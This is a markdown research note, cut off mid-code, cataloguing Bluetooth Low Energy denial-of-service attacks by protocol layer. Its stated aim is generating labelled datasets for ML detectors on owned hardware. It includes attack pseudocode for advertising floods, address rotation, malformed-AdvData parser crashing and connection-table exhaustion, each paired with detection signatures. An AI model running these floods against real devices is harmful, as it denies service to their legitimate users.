---
title: BLE DoS Attack Theory & Analysis
tags: [BLE, DoS, attack-analysis, vulnerability-research, exploitation]
category: BLE Security
parent: "[[BLE/DoS/README]]"
status: complete
---

# BLE DoS Attack Theory & Analysis

> **Purpose**: Comprehensive analysis of Denial of Service attack vectors across all BLE protocol layers, including exploitation mechanics, hardware requirements, and implementation approaches.


> **Audience:** Security researchers with basic BLE stack knowledge (PHY → LL → L2CAP → ATT/GATT/SMP) who want to implement attacks for security testing and ML model training.

> **Hardware Focus:** Linux laptop, Raspberry Pi 5, Ubertooth One, nRF52840 dongles/devkits

> **Goal:** Generate labeled DoS attack datasets through controlled, reproducible experiments on owned infrastructure.

---

## 1. Prerequisites & Objectives

### 1.1 Assumed Knowledge
You should already understand:
- **BLE stack layers:** Physical, Link Layer (LL), L2CAP, ATT, GATT, SMP, GAP
- **PDU types:** Advertising PDUs (ADV_IND, SCAN_REQ, SCAN_RSP, CONNECT_IND), Data Channel PDUs
- **Connection establishment:** Advertiser → Scanner → Initiator → Central/Peripheral roles
- **GATT hierarchy:** Services → Characteristics → Descriptors
- **Packet structure basics:** Headers, payloads, CRC

### 1.2 What This Document Adds
- **Exploitation mechanics:** How to manipulate each protocol layer for attack purposes
- **Hardware limitations:** What each device can and cannot do (controller firmware constraints)
- **Attack implementation:** Concrete approaches using BlueZ, raw sockets, nRF firmware
- **Dataset generation:** Capture workflows, labeling strategies, feature extraction
- **Failure mode analysis:** Why attacks fail and how to debug

### 1.3 Primary Objectives
1. **Security research:** Understand BLE attack surface through hands-on implementation
2. **Dataset generation:** Create labeled packet captures of 25+ attack types
3. **ML model training:** Generate features from captures to train DoS detection models
4. **Hardening insights:** Identify which attacks succeed and why (vendor comparison)

---

## 2. BLE Attack Surface - Complete Technical Map

### 2.1 Layer-by-Layer Exploitation Points

#### 2.1.1 Physical Layer (PHY)
**Wire Protocol:**
- Frequency: 2.4 GHz ISM band, 40 channels (3 advertising, 37 data)
- Modulation: GFSK (Gaussian Frequency Shift Keying)
- Data rate: 1 Mbps (BLE 4.x), 2 Mbps (BLE 5+)

**Exploitation Vectors:**
- **Jamming:** Transmit noise on advertising/data channels (requires SDR or Ubertooth experimental mode)
- **Selective jamming:** Target specific channel during connection (requires precise timing)
- **Power analysis:** RSSI manipulation for location tracking (passive with Ubertooth)

**Hardware Requirements:** SDR (HackRF/USRP) for jamming; Ubertooth for RSSI analysis

**Practical Focus:** ❌ Out of scope (requires SDR), but Ubertooth can capture RSSI for benign analysis

---

#### 2.1.2 Link Layer (LL) - Advertising Channel

**Advertising PDU Structure (10-47 bytes):**
```
Byte 0: Header (PDU Type[4], RFU[2], TxAdd[1], RxAdd[1])
Byte 1: Length (6 bits) + RFU (2 bits)
Bytes 2-7: AdvAddr (6 bytes)
Bytes 8-N: AdvData (0-31 bytes for legacy, up to 255 for extended)
Bytes N+1 to N+3: CRC (3 bytes, added by controller)
```

**Key Header Fields:**
| Field | Bits | Values | Exploitation |
|-------|------|--------|--------------|
| PDU Type | 4 | 0x0=ADV_IND, 0x1=ADV_DIRECT_IND, 0x2=ADV_NONCONN_IND, 0x3=SCAN_REQ, 0x4=SCAN_RSP, 0x6=CONNECT_IND | Flood with ADV_IND, spoof SCAN_RSP |
| TxAdd/RxAdd | 1 each | 0=Public, 1=Random | Address type confusion |
| Length | 6 | 0-37 (legacy) | Max length for resource exhaustion |
| AdvAddr | 48 | MAC address | Spoof legitimate devices, vary for filter bypass |
| AdvData | 0-248 bits | AD structures | Max size for memory exhaustion |

**Exploitation Techniques:**
1. **Advertising flood:** Rapid transmission of ADV_IND packets (saturate scanners)
2. **Scan response amplification:** ADV_SCANNABLE_IND + max SCAN_RSP data
3. **Address spoofing:** Rotate AdvAddr to bypass scanner duplicate filtering
4. **Malformed AdvData:** Invalid AD structure lengths (crash parsers)

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** Can set AdvData and enable/disable advertising via HCI commands (controller handles PDU formatting)
- **nRF52840:** Full control over PDU structure, precise timing (firmware-level)
- **Ubertooth:** Passive capture of all advertising PDUs with timestamps

---

#### 2.1.3 Link Layer (LL) - Data Channel

**Data Channel PDU Structure (2-257 bytes):**
```
Byte 0-1: Header (LLID[2], NESN[1], SN[1], MD[1], RFU[3], Length[8])
Bytes 2-N: Payload (0-251 bytes)
Bytes N+1 to N+3: MIC (4 bytes if encrypted)
Bytes N+4 to N+6: CRC (3 bytes, added by controller)
```

**Key Header Fields:**
| Field | Bits | Values | Exploitation |
|-------|------|--------|--------------|
| LLID | 2 | 0x1=LL Data (continuation), 0x2=LL Data (start), 0x3=LL Control PDU | Empty data floods, malformed control PDUs |
| NESN | 1 | Next Expected Sequence Number | Force retransmissions by wrong NESN |
| SN | 1 | Sequence Number | Replay attacks, DoS via fixed SN |
| MD | 1 | More Data flag | Keep connection alive with empty data |
| Length | 8 | 0-251 | Max payload for resource exhaustion |

**LL Control PDU Opcodes (for LLID=0x3):**
| Opcode | Name | Exploitation |
|--------|------|--------------|
| 0x02 | LL_TERMINATE_IND | Force disconnection |
| 0x03 | LL_CHANNEL_MAP_IND | Invalid channel maps |
| 0x0C | LL_PAUSE_ENC_REQ | Downgrade encryption |
| 0x13 | LL_LENGTH_REQ | Trigger MTU negotiation loops |

**Exploitation Techniques:**
1. **Retransmission storm:** Send data with fixed SN, victim retransmits endlessly
2. **Empty packet flood:** LLID=0x1, Length=0 (minimal attacker cost, victim still processes)
3. **LL control abuse:** Rapid LL_LENGTH_REQ → force renegotiation
4. **Connection jamming:** Transmit on connection channels (requires nRF/SDR)

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ❌ Cannot manipulate LL header directly (controller handles SN/NESN)
- **nRF52840:** ✅ Full control via firmware (access to `ble_ll_conn_tx_pdu()` in NimBLE)
- **Ubertooth:** ✅ Captures LL PDUs with SN/NESN visible in Wireshark

---

#### 2.1.4 HCI (Host-Controller Interface)

**HCI Packet Types:**
```
1. HCI Command (Host → Controller):
   Byte 0: Packet Type (0x01)
   Bytes 1-2: OpCode (OGF[6 bits] + OCF[10 bits])
   Byte 3: Parameter Length
   Bytes 4-N: Parameters

2. HCI Event (Controller → Host):
   Byte 0: Packet Type (0x04)
   Byte 1: Event Code
   Byte 2: Parameter Length
   Bytes 3-N: Parameters

3. HCI ACL Data (bidirectional):
   Byte 0: Packet Type (0x02)
   Bytes 1-2: Handle[12] + PB[2] + BC[2]
   Bytes 3-4: Data Total Length
   Bytes 5-N: Data (L2CAP packet)
```

**Critical HCI Commands for Attacks:**
| OpCode | Name | OGF/OCF | Parameters | Exploitation |
|--------|------|---------|------------|--------------|
| 0x200A | LE Set Advertising Enable | 0x08/0x000A | Enable[1] | Rapid toggle for advertising flood |
| 0x2008 | LE Set Advertising Data | 0x08/0x0008 | Length[1], Data[31] | Change AdvData rapidly |
| 0x200D | LE Create Connection | 0x08/0x000D | ScanInterval, ConnInterval, etc. | Connection exhaustion |
| 0x2006 | LE Set Scan Parameters | 0x08/0x0006 | ScanType, Interval, Window | Scanner exhaustion |
| 0x0C03 | Reset | 0x03/0x0003 | None | Force controller reset (DoS self) |

**HCI ACL Data - Fragmentation:**
| Field | Bits | Values | Exploitation |
|-------|------|--------|--------------|
| Handle | 12 | Connection handle | Target specific connection |
| PB (Packet Boundary) | 2 | 0x2=First, 0x1=Continuing, 0x0=Continuation fragment, 0x3=Complete | Fragment abuse: send continuing without first/last |
| BC (Broadcast) | 2 | 0x0=Point-to-point | Unused in LE |
| Data Total Length | 16 | 0-65535 | Length mismatch attacks |

**Exploitation Techniques:**
1. **HCI command storm:** Flood controller with rapid LE Set Advertising Enable toggles
2. **Command queue exhaustion:** Send commands faster than Command Complete events return
3. **Fragmentation DoS:** Send HCI ACL "continuing" fragments without initial fragment (victim buffers endlessly)
4. **Parameter extremes:** Use min/max values in LE Create Connection (7.5ms vs 4s intervals)

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ✅ Full HCI command access via raw sockets (`socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)`)
- **nRF52840:** ✅ Can send HCI commands via SoftDevice API
- **Ubertooth:** ❌ Cannot inject HCI (captures over-the-air only)

**Capture:**
- Use `btmon -w hci.log` on attacker/victim to see HCI commands/events
- Ubertooth captures the *result* of HCI commands (advertising/data PDUs on air)

---

#### 2.1.5 L2CAP (Logical Link Control and Adaptation Protocol)

**L2CAP Basic Header (4 bytes):**
```
Bytes 0-1: Length (16 bits, little-endian) - L2CAP payload length
Bytes 2-3: Channel ID (CID, 16 bits)
```

**Fixed Channel IDs (CIDs):**
| CID | Purpose | Exploitation |
|-----|---------|--------------|
| 0x0004 | ATT protocol | Flood with ATT requests |
| 0x0005 | LE L2CAP Signaling | Signaling command storm |
| 0x0006 | SMP (Security Manager) | Pairing abuse |
| 0x0040-0x007F | Dynamic (LE Credit Based) | Credit exhaustion attacks |

**L2CAP Signaling Packet (CID=0x0005):**
```
Byte 0: Code (command type)
Byte 1: Identifier (matches request/response)
Bytes 2-3: Length
Bytes 4-N: Data (command-specific)
```

**L2CAP Signaling Codes:**
| Code | Name | Exploitation |
|------|------|--------------|
| 0x12 | Connection Parameter Update Request | Parameter update storm |
| 0x14 | LE Credit Based Connection Request | Exhaust credit-based channels |
| 0x16 | LE Flow Control Credit | Credit manipulation |

**Exploitation Techniques:**
1. **Length mismatch:** L2CAP Length=65535, but HCI ACL Data Length=10 (victim buffers waiting)
2. **Signaling flood:** Rapid Connection Parameter Update Requests with extreme values
3. **Credit exhaustion:** Open max LE Credit Based Connections, never send credits
4. **Invalid CID:** Send data to non-existent CID (some stacks crash)

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ✅ L2CAP socket access (`socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)`)
- **nRF52840:** ✅ Full L2CAP control via SoftDevice `sd_ble_l2cap_*` functions
- **Ubertooth:** ✅ Captures L2CAP packets within Data Channel PDUs

---

#### 2.1.6 ATT (Attribute Protocol)

**ATT PDU Structure:**
```
Byte 0: Opcode (request/response/notification type)
Bytes 1-N: Parameters (opcode-dependent)
```

**Critical ATT Opcodes:**
| Opcode | Name | Direction | Parameters | Exploitation |
|--------|------|-----------|------------|--------------|
| 0x0A | Read Request | C→S | Handle[2] | Read flood |
| 0x12 | Write Request | C→S | Handle[2], Value[0-512] | Write flood (victim must respond) |
| 0x52 | Write Command | C→S | Handle[2], Value[0-512] | **Primary DoS vector** (no response required) |
| 0x1B | Handle Value Notification | S→C | Handle[2], Value[0-512] | Notification storm (if controlling peripheral) |
| 0x1D | Handle Value Indication | S→C | Handle[2], Value[0-512] | Indication flood (requires confirm) |
| 0x08 | Read By Type Request | C→S | StartHandle[2], EndHandle[2], Type[UUID] | Service discovery abuse |

**ATT Error Response (Opcode 0x01):**
```
Byte 0: 0x01 (Error Response)
Byte 1: Request Opcode in Error
Bytes 2-3: Attribute Handle
Byte 4: Error Code (e.g., 0x0A=Attribute Not Found)
```

**Exploitation Techniques:**
1. **Write Without Response flood (0x52):** Max MTU (512 bytes), max rate → server must process immediately, no flow control
2. **Write Request flood (0x12):** Victim must send ATT Write Response for each → response queue exhaustion
3. **Read flood (0x0A):** Force server to retrieve and send data repeatedly
4. **Invalid handle abuse:** Write to non-existent handles → error response generation overhead
5. **MTU exploitation:** Send max MTU (512 bytes) in single ATT PDU → memory allocation stress

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ✅ Via `bleak` library (GATT client), or raw L2CAP socket with CID=0x0004
- **nRF52840:** ✅ Full ATT control via `sd_ble_gattc_*` (client) or `sd_ble_gatts_*` (server)
- **Ubertooth:** ✅ Captures ATT PDUs within L2CAP (CID=0x0004)

---

#### 2.1.7 GATT (Generic Attribute Profile)

**GATT is an application layer built on ATT.** It defines how attributes are grouped into services and characteristics.

**GATT Operations → ATT Opcodes:**
| GATT Operation | ATT Opcode | Response Required | Exploitation |
|----------------|------------|-------------------|--------------|
| Write Without Response | 0x52 | No | **Highest DoS potential** |
| Write | 0x12 | Yes (0x13) | Queue exhaustion |
| Read | 0x0A | Yes (0x0B) | Force data retrieval |
| Notify | 0x1B | No | Storm clients (if peripheral) |
| Indicate | 0x1D | Yes (0x1E) | Confirmation queue exhaustion |

**Characteristic Properties (relevant to attacks):**
- **WRITE_WITHOUT_RESPONSE (0x04):** Enables 0x52 floods
- **NOTIFY (0x10):** Enables notification storms from server
- **WRITE (0x08):** Enables write request floods

**Exploitation Techniques:**
1. **Notification storm:** If controlling peripheral, enable notifications on characteristic, send max rate
2. **Indication abuse:** Send indications faster than central confirms (queue exhaustion)
3. **Descriptor flood:** Repeatedly write to CCCD (Client Characteristic Configuration Descriptor, 0x2902)
4. **Service discovery abuse:** Repeated "Discover All Primary Services" (Read By Group Type 0x02)

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ✅ Via `bleak` (high-level GATT API) or BlueZ D-Bus (server mode)
- **nRF52840:** ✅ Full GATT server/client via SoftDevice
- **Ubertooth:** ✅ Captures GATT transactions (as ATT PDUs)

---

#### 2.1.8 SMP (Security Manager Protocol)

**SMP Packet Structure (over L2CAP CID=0x0006):**
```
Byte 0: Code (pairing command type)
Bytes 1-N: Code-specific payload
```

**SMP Codes:**
| Code | Name | Exploitation |
|------|------|--------------|
| 0x01 | Pairing Request | Repeated requests without completion |
| 0x02 | Pairing Response | Malformed parameters |
| 0x03 | Pairing Confirm | Invalid confirm values |
| 0x04 | Pairing Random | Nonce manipulation |
| 0x05 | Pairing Failed | Trigger error handling loops |
| 0x0C | Pairing Public Key | Invalid elliptic curve points (crashes) |

**Pairing Flow (LE Secure Connections):**
```
1. Central → Pairing Request (0x01)
2. Peripheral → Pairing Response (0x02)
3. Central → Pairing Public Key (0x0C)
4. Peripheral → Pairing Public Key (0x0C)
5. Central → Pairing Confirm (0x03)
6. Peripheral → Pairing Confirm (0x03)
7. Central → Pairing Random (0x04)
8. Peripheral → Pairing Random (0x04)
9. DHKey Check exchange...
```

**Exploitation Techniques:**
1. **Pairing request spam:** Send Pairing Request every 100ms without completing handshake (victim maintains state)
2. **Malformed public keys:** Send invalid elliptic curve points (crashes some stacks)
3. **Just Works downgrade:** Request IO Capability=NoInputNoOutput → force weak pairing
4. **Confirm mismatch:** Send wrong confirm value → pairing failure, retry loop
5. **Key size manipulation:** Request min key size (7 bytes) → weak encryption

**Hardware Capabilities:**
- **Laptop/RPi (BlueZ):** ⚠️ Limited - can initiate pairing via BlueZ agent, but cannot craft malformed SMP packets easily
- **nRF52840:** ✅ Full SMP control via SoftDevice `sd_ble_gap_sec_*` functions, can inject malformed packets with custom firmware
- **Ubertooth:** ✅ Captures SMP packets (L2CAP CID=0x0006), but cannot decrypt without key exchange capture

---

### 2.2 Hardware Capability Matrix

| **Attack Vector** | **Layer** | **Laptop/RPi (BlueZ)** | **nRF52840** | **Ubertooth One** | **SDR** |
|-------------------|-----------|------------------------|--------------|-------------------|---------|
| Advertising flood | LL Adv | ✅ Via HCI (controller formats PDU) | ✅ Full control (firmware) | ⚠️ Experimental TX mode | ✅ Full control |
| Scan response amplification | LL Adv | ✅ Via HCI | ✅ Full control | ❌ RX only (normally) | ✅ Full control |
| Connection request flood | LL | ✅ Via HCI LE_Create_Connection | ✅ Full control | ❌ RX only | ✅ Full control |
| LL PDU manipulation (SN/NESN) | LL Data | ❌ Controller handles | ✅ Firmware-level | ❌ RX only | ✅ Full control |
| HCI command storm | HCI | ✅ Raw socket | ✅ Via SoftDevice | ❌ Not applicable | ❌ Not applicable |
| HCI ACL fragmentation abuse | HCI | ✅ Raw socket | ✅ Via SoftDevice | ❌ Not applicable | ❌ Not applicable |
| L2CAP signaling flood | L2CAP | ✅ L2CAP socket | ✅ Via SoftDevice | ❌ TX not supported | ✅ Via custom stack |
| L2CAP length mismatch | L2CAP | ✅ L2CAP socket | ✅ Via SoftDevice | ❌ TX not supported | ✅ Via custom stack |
| ATT Write Without Response flood | ATT | ✅ Via `bleak` or raw L2CAP | ✅ Via SoftDevice | ❌ TX not supported | ✅ Via custom stack |
| ATT Read/Write Request flood | ATT | ✅ Via `bleak` | ✅ Via SoftDevice | ❌ TX not supported | ✅ Via custom stack |
| GATT notification storm | GATT | ⚠️ As peripheral (BlueZ D-Bus) | ✅ As peripheral | ❌ TX not supported | ✅ Via custom stack |
| SMP pairing abuse | SMP | ⚠️ Via BlueZ agent (limited) | ✅ Full control | ❌ TX not supported | ✅ Via custom stack |
| **Passive sniffing** | All | ❌ (Need Ubertooth) | ⚠️ Nordic sniffer mode | ✅ **Best option** | ✅ Full spectrum |
| **Timing precision (<1ms)** | All | ❌ USB+scheduler jitter | ✅ µs-level control | ❌ Capture only | ✅ µs-level control |

**Legend:**
- ✅ Fully supported, recommended
- ⚠️ Partial support or workarounds needed
- ❌ Not supported or impractical

---

### 2.3 Raspberry Pi 5 Specific Considerations

**Bluetooth Controller:** Broadcom BCM43xx (exact model varies by RPi5 revision)

**Known Limitations (similar to your WiFi brcmfmac experience):**

1. **Firmware Rate Limiting:**
   ```bash
   # BCM Bluetooth firmware throttles HCI commands
   # Symptoms: Commands silently dropped, no error in btmon
   # Detection: Compare HCI commands sent vs. PDUs on air (Ubertooth)
   # Mitigation: Reduce rate, use burst-pause pattern
   ```

2. **Thermal Throttling:**
   ```bash
   # RPi5 CPU throttles under load, affects Bluetooth performance
   vcgencmd measure_temp    # Check temperature
   vcgencmd get_throttled   # Check throttle status
   # Bit 0-1: Under-voltage, Bit 2: Frequency capped
   # Mitigation: Active cooling, separate USB dongle for Bluetooth
   ```

3. **USB Power Limits:**
   ```bash
   # Multiple USB Bluetooth dongles may exceed power budget
   # Symptoms: Random disconnects, hciconfig shows device missing
   # Mitigation: Powered USB hub, or use RPi5 built-in BT + 1-2 dongles max
   ```

4. **BlueZ Version Differences:**
   ```bash
   bluetoothd --version  # Check BlueZ version
   # RPi5 (Debian-based): Often 5.55-5.66
   # Ubuntu 22.04 laptop: 5.64+
   # API differences in btmgmt commands, GATT D-Bus interfaces
   ```

**Laptop vs RPi5 Recommendation:**
- **Laptop (primary development):** Faster compile times, better debugging tools, stable USB stack
- **RPi5 (victim device or secondary attacker):** Realistic embedded target, test hardware limitations
- **USB Bluetooth dongles (on both):** Bypass built-in controller issues, use multiple adapters in parallel

---

### 2.4 USB Bluetooth Adapter Recommendations

| **Adapter** | **Chipset** | **Monitor Mode** | **Packet Injection** | **Price** | **Use Case** |
|-------------|-------------|------------------|----------------------|-----------|--------------|
| CSR8510 Dongle | CSR8510 | ❌ | ❌ | $5-10 | Cheap for basic attacks, BlueZ works well |
| Broadcom BCM20702 | BCM20702 | ❌ | ❌ | $10-15 | Better firmware stability than CSR |
| Intel AX200/AX210 | Intel | ❌ | ❌ | $20-30 | Best Linux support, stable for multi-hour tests |
| **Ubertooth One** | CC2400 + LPC175x | ✅ **Yes** | ⚠️ Experimental | $120 | **Required for packet capture** |
| **nRF52840 Dongle** | Nordic nRF52840 | ⚠️ Via sniffer fw | ✅ **Full control** | $10 | **Best for custom attacks** |

**Recommendation for Your Setup:**
```
1× Ubertooth One → Passive capture (always on, logs all trials)
2× Intel AX210 dongles → Laptop primary attacker, secondary attacker/victim
1× nRF52840 Dongle → Timing-critical attacks (flash custom firmware as needed)
Built-in RPi5 Bluetooth → Victim device (test embedded targets)
```

**Why avoid CSR8510 for serious research:**
- Firmware bugs under high load (device resets)
- Poor HCI command throughput
- Inconsistent behavior across units (quality control issues)

---

## 3. Comprehensive Attack Catalog

### 3.1 Advertising Layer Attacks (Layer: Link Layer Advertising)

#### Attack 3.1.1: Basic Advertising Flood
**Description:** Saturate 2.4 GHz spectrum on advertising channels (37, 38, 39) with continuous ADV_IND packets.

**Header Fields Manipulated:**
- PDU Type: `0x0` (ADV_IND - connectable undirected advertising)
- Length: `37` bytes (max for legacy advertising)
- AdvData: `31` bytes of payload (max)

**Hardware:** Laptop/RPi (BlueZ HCI) or nRF52840

**Implementation Approach:**
```python
# Pseudocode
function basic_advertising_flood(iface, rate_hz, duration_s):
    hci_socket = open_hci_socket(iface)
    
    # Craft max-length advertising data
    adv_data = struct.pack('<B', 31) + b'\xFF' * 30  # Length prefix + data
    
    # HCI command: LE Set Advertising Data (OpCode 0x2008)
    set_adv_data_cmd = build_hci_command(
        ogf=0x08, ocf=0x0008,
        params=struct.pack('<B31s', 31, adv_data[:31])
    )
    
    # HCI command: LE Set Advertising Enable (OpCode 0x200A)
    enable_adv = build_hci_command(ogf=0x08, ocf=0x000A, params=b'\x01')
    disable_adv = build_hci_command(ogf=0x08, ocf=0x000A, params=b'\x00')
    
    stop_time = now() + duration_s
    count = 0
    
    while now() < stop_time:
        hci_socket.send(set_adv_data_cmd)
        hci_socket.send(enable_adv)
        sleep(1.0 / rate_hz)
        count += 1
        
        # Controller may rate-limit, check btmon for command status
        if count % 100 == 0:
            log_event('adv_flood_progress', count)
    
    hci_socket.send(disable_adv)
    hci_socket.close()
```

**Expected Victim Behavior:**
- Scanner devices experience high CPU usage processing advertisements
- Duplicate filtering mechanisms stressed (if AdvAddr is static)
- GUI-based scanners (smartphones) become slow/unresponsive

**Detection Signatures (ML Features):**
- High packet rate on channels 37/38/39 (>100 pkt/s per channel)
- Identical AdvData across packets
- Uniform inter-arrival time (deterministic attacker)
- Single source MAC address (AdvAddr)

**Capture Metadata (JSON):**
```json
{
  "attack_type": "basic_advertising_flood",
  "rate_hz": 50,
  "duration_s": 30,
  "adv_data_hex": "1EFF...",
  "adv_addr": "AA:BB:CC:DD:EE:FF",
  "channels_flooded": [37, 38, 39]
}
```

---

#### Attack 3.1.2: Scan Response Amplification
**Description:** Respond to every SCAN_REQ with maximum-length SCAN_RSP, amplifying network load.

**Header Fields Manipulated:**
- PDU Type: `0x4` (SCAN_RSP)
- Length: `37` bytes
- ScanRspData: `31` bytes

**Hardware:** nRF52840 (requires ability to respond to SCAN_REQ reactively)

**Implementation Approach:**
```c
// Pseudocode (nRF52840 firmware)
void setup_scan_response_amplification() {
    uint8_t scan_rsp_data[31];
    memset(scan_rsp_data, 0xFF, 31);  // Max length payload
    
    // Configure advertising as scannable
    ble_gap_adv_params_t adv_params = {
        .type = BLE_GAP_ADV_TYPE_SCANNABLE_UNDIRECTED,
        .interval = 32,  // 20ms (fast advertising)
    };
    
    // Set scan response data
    sd_ble_gap_adv_data_set(NULL, 0, scan_rsp_data, 31);
    sd_ble_gap_adv_start(&adv_params);
}

void on_scan_req_received(ble_gap_evt_t *evt) {
    // Automatically handled by SoftDevice, but can log
    log_event("SCAN_REQ from", evt->params.scan_req_report.peer_addr);
    // SoftDevice sends SCAN_RSP with configured data
}
```

**Expected Victim Behavior:**
- Scanner sends SCAN_REQ on channel X
- Attacker sends SCAN_RSP (37 bytes) on same channel
- Scanner must process 31 bytes of data per scan
- Active scanning becomes expensive (vs passive listening to ADV_IND only)

**Detection Signatures:**
- High SCAN_RSP packet rate
- SCAN_RSP size consistently 37 bytes
- SCAN_REQ → SCAN_RSP timing tight (<10ms)

---

#### Attack 3.1.3: Address Rotation Flood
**Description:** Rapidly change AdvAddr to bypass scanner duplicate filtering (most scanners cache MAC addresses).

**Header Fields Manipulated:**
- AdvAddr: Rotate through range (e.g., AA:BB:CC:DD:EE:00 to AA:BB:CC:DD:EE:FF)
- PDU Type: `0x0` (ADV_IND)

**Hardware:** Laptop/RPi (HCI) or nRF52840

**Implementation Approach:**
```python
function address_rotation_flood(iface, rate_hz, duration_s):
    addr_pool = generate_random_mac_addresses(count=256)
    stop_time = now() + duration_s
    idx = 0
    
    while now() < stop_time:
        current_addr = addr_pool[idx % len(addr_pool)]
        
        # HCI: LE Set Advertising Parameters (includes AdvAddr indirectly via Set Random Address)
        set_random_addr_cmd = build_hci_command(
            ogf=0x08, ocf=0x0005,  # LE Set Random Address
            params=current_addr  # 6 bytes
        )
        hci_socket.send(set_random_addr_cmd)
        
        # Enable advertising with new address
        enable_adv_cmd = build_hci_command(ogf=0x08, ocf=0x000A, params=b'\x01')
        hci_socket.send(enable_adv_cmd)
        
        sleep(1.0 / rate_hz)
        idx += 1
```

**Expected Victim Behavior:**
- Scanner's duplicate filter becomes ineffective (every packet appears "new")
- Higher processing load (cannot skip duplicates)
- Address cache exhaustion (if scanner stores all seen addresses)

**Detection Signatures:**
- High unique AdvAddr count in short time window (<100ms)
- Addresses follow pattern (e.g., sequential, or specific OUI)
- Identical AdvData across different AdvAddrs (unusual in legitimate scenarios)

---

#### Attack 3.1.4: Malformed AdvData (Fuzzing)
**Description:** Send advertising packets with invalid AD structure lengths to crash parsers.

**Header Fields Manipulated:**
- AdvData: Crafted with incorrect length fields in AD structures

**AD Structure Format:**
```
Byte 0: Length (N, includes this byte and Type byte)
Byte 1: Type (e.g., 0x09 = Complete Local Name)
Bytes 2-N: Data
```

**Malformed Examples:**
```python
# Length field > actual remaining bytes
adv_data = b'\x1F\x09' + b'Short'  # Length=31, but only 5 data bytes follow

# Length field = 0 (immediate next structure)
adv_data = b'\x00' + b'\x05\x09Test'

# Length field > 31 (exceeds max AdvData)
adv_data = b'\xFF\x09' + b'X' * 30
```

**Hardware:** Laptop/RPi (HCI) - controller may validate and reject, so nRF52840 firmware better

**Implementation Approach:**
```c
// nRF52840 firmware (bypass SoftDevice validation)
void send_malformed_advdata() {
    uint8_t raw_pdu[39];  // LL Adv PDU: Header(2) + AdvAddr(6) + AdvData(31)
    
    raw_pdu[0] = 0x00;  // PDU Type: ADV_IND, TxAdd=Public
    raw_pdu[1] = 37;    // Length = 31 AdvData + 6 AdvAddr
    memcpy(&raw_pdu[2], attacker_addr, 6);
    
    // Malformed AdvData: Length > actual
    raw_pdu[8] = 0x1F;   // Length = 31
    raw_pdu[9] = 0x09;   // Type = Complete Local Name
    memcpy(&raw_pdu[10], "ABC", 3);  // Only 3 bytes, not 29
    
    // Transmit raw PDU via RADIO peripheral
    send_raw_ll_pdu(raw_pdu, 39);
}
```

**Expected Victim Behavior:**
- **Best case:** Parser ignores malformed structure, continues
- **Common case:** Parser logs error, skips packet
- **Worst case (goal):** Parser crashes (buffer overflow, assertion failure)

**Detection Signatures:**
- Unusual AdvData patterns (length mismatches detectable via parsing attempts)
- Repeated malformed packets from same AdvAddr (fuzzing campaign)

---

### 3.2 Connection Layer Attacks

#### Attack 3.2.1: Connection Request Flood
**Description:** Initiate maximum connections to victim peripheral to exhaust connection table.

**Header Fields Manipulated:**
- LL CONNECT_IND PDU: Access Address, CRCInit, Interval, Timeout

**BLE Spec Limits:**
- Most devices support 1-8 simultaneous connections
- Embedded devices often max at 3-4 connections

**Hardware:** Laptop/RPi (HCI LE_Create_Connection) or nRF52840

**Implementation Approach:**
```python
function connection_request_flood(victim_addr, max_connections):
    connections = []
    
    for i in range(max_connections):
        try:
            # HCI: LE Create Connection (OpCode 0x200D)
            conn = ble_connect(
                peer_addr=victim_addr,
                scan_interval=0x0010,    # 10ms
                scan_window=0x0010,      # 10ms
                conn_interval_min=0x0006,  # 7.5ms (min)
                conn_interval_max=0x0C80,  # 4s (max)
                conn_latency=0x0000,
                supervision_timeout=0x0C80  # 32s
            )
            
            if conn.success:
                connections.append(conn)
                log_event('connection_established', i, conn.handle)
        except ControllerError as e:
            log_event('connection_failed', i, e)
            break
    
    # Hold connections open (don't disconnect)
    log_event('connection_flood_complete', len(connections))
    
    # Wait (victim cannot accept new connections)
    sleep(300)  # 5 minutes
    
    # Cleanup
    for conn in connections:
        conn.disconnect()
```

**Expected Victim Behavior:**
- After N connections, victim stops responding to CONNECT_IND
- Legitimate users cannot connect
- Victim may become unresponsive (CPU busy managing connections)

**Detection Signatures:**
- Multiple connections from same MAC address(es) in short time
- Connections with minimal data transfer (idle connections)
- High connection establishment rate

---

#### Attack 3.2.2: Connection Parameter Extremes
**Description:** Use minimum interval (7.5ms) to maximize collision rate, or maximum (4s) to hold resources.

**Header Fields Manipulated:**
- LL CONNECT_IND: Interval, Latency, Timeout

**Hardware:** Laptop/RPi or nRF52840

**Implementation Approach:**
```python
# Minimum interval (high collision, resource usage)
function connection_min_interval_attack(victim_addr):
    conn = ble_connect(
        peer_addr=victim_addr,
        conn_interval_min=0x0006,  # 7.5ms (minimum spec-compliant)
        conn_interval_max=0x0006,
        conn_latency=0x0000,
        supervision_timeout=0x000A  # 100ms (minimum)
    )
    
    # Send empty packets continuously at 7.5ms interval
    while connected:
        send_empty_ll_data(conn.handle)
        sleep(0.0075)

# Maximum interval (resource hold)
function connection_max_interval_attack(victim_addr):
    conn = ble_connect(
        peer_addr=victim_addr,
        conn_interval_min=0x0C80,  # 4s (maximum)
        conn_interval_max=0x0C80,
        conn_latency=0x01F3,  # 499 (max slave latency)
        supervision_timeout=0x0C80  # 32s
    )
    
    # Hold connection, minimal traffic
    # Victim resources locked for this connection
```

**Expected Victim Behavior:**
- **Min interval:** High CPU usage, frequent radio activity, battery drain
- **Max interval:** Connection slots reserved but underutilized

**Detection Signatures:**
- Connection intervals at spec limits (7.5ms or 4s)
- Latency parameter at max (499)

---

#### Attack 3.2.3: Empty Packet Flood (LL Data PDU)
**Description:** Send maximum rate of LL Data PDUs with zero-length payload.

**Header Fields Manipulated:**
- LLID: `0x01` (LL Data PDU, continuation)
- Length: `0` bytes
- SN: Toggle correctly (to avoid retransmissions)

**Hardware:** nRF52840 (requires LL-level control)

**Implementation Approach:**
```c
// nRF52840 firmware
void empty_packet_flood(uint16_t conn_handle) {
    uint8_t empty_pdu[2];  // LL header only
    
    empty_pdu[0] = 0x01;  // LLID=1 (Data continuation), NESN=0, SN=0, MD=0
    empty_pdu[1] = 0x00;  // Length=0
    
    while (attack_active) {
        // Send at max rate (every connection event)
